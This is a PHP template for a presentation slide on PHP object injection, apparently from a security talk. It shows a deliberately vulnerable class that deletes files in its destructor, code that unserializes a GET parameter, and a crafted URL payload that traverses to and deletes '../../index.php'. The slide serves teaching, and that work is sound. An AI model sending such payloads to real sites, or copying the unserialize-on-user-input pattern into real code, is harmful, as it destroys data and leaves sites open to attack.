<section class="slide" id="<?= getSlideId(__FILE__) ?>">
    <div>
        <span class="chapter">PHP Object Injection</span>

        <div class="fs-65">
        <?php echo code('php', '
class Example1
{
   public $cache_file;

   function __destruct() {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...
$user_data = unserialize($_GET[\'data\']);
// some PHP code...
') ?>
        </div>
        <div class="fs-50">
        <?php echo code('html', 'http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}') ?>
        </div>




    </div>
</section>